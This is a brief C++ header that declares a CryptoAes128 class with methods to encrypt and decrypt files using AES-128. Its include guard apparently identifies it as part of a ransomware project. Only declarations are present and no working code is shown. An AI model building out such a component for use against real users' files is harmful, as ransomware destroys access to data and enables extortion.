//
// Created by prang on 25.09.2024.
//

#ifndef RANSOMWARE_CRYPTOAES128_H
#define RANSOMWARE_CRYPTOAES128_H

#include "../../include/global.h"
#include <filesystem>

namespace fs = std::filesystem;

class CryptoAes128 {
public:
  bool encryptFileAES128(const fs::path &input_file, const fs::path &output_file);

  bool decryptFileAES128(const CryptoData &cryptoData, const fs::path &decryptedFilePath);
};


#endif //RANSOMWARE_CRYPTOAES128_H
